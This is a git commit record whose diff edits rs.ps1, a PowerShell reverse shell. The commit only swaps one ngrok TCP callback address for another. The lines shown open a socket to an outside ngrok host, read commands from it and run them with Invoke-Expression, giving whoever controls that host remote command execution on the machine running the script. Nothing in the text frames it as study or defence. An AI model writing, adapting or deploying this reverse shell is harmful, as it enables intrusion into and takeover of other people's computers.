9490c61511bd309f389964a6c6b4127d4712f515
Kaan Doyurur <71555245+uvsq22005188@users.noreply.github.com>
2022-12-15 19:07:35 +0100

    Modification ip

--- rs.ps1
+++ rs.ps1
@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient('2.tcp.eu.ngrok.io',18803);
+$client = New-Object System.Net.Sockets.TCPClient('4.tcp.eu.ngrok.io',15443);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2>&1 | Out-String );
